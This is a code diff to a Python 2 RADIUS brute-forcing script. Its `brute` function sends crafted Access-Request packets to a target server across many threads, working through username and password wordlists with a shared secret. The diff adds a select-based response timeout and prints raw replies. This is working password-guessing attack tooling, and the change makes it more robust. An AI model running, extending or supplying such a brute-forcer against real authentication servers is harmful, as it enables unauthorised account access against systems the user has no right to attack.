@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 from multiprocessing.dummy import Pool
-import socket, hashlib, argparse, re, textwrap, sys
+import socket, hashlib, argparse, re, textwrap, sys, select
 
 
 '''
@@ -76,10 +76,15 @@ def brute(user):
 
         # send it
         socket.sendto(RADIUS_CODE + pack_id + pkt_len_hex + AUTHENTICATOR + AVP_UNAME_TYPE + avp_uname_len_hex + user + AVP_PWD_TYPE + avp_pwd_len_hex + encrypted, (args.ip, int(args.port)))
-        resp_hex = socket.recv(2048).encode("hex")
-        resp_code = resp_hex[:2]
-        if resp_code == "02":
-            print "success with secret: %s and password: %s" % (args.secret, pwd)
+        ready = select.select([socket], [], [], 5)
+        if ready[0]:
+            resp_hex = socket.recv(2048).encode("hex")
+            print resp_hex
+            resp_code = resp_hex[:2]
+            if resp_code == "02":
+                print "success with secret: %s and password: %s" % (args.secret, pwd)
+        else:
+            print "Timeout"
 
 # parse arguments
 parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
@@ -134,6 +139,7 @@ allpasses = [x.strip() for x in allpasses]
 
 # prepare socket
 socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+socket.setblocking(0)
 
 pool = Pool(int(args.thread))
 pool.map(brute, allusers)
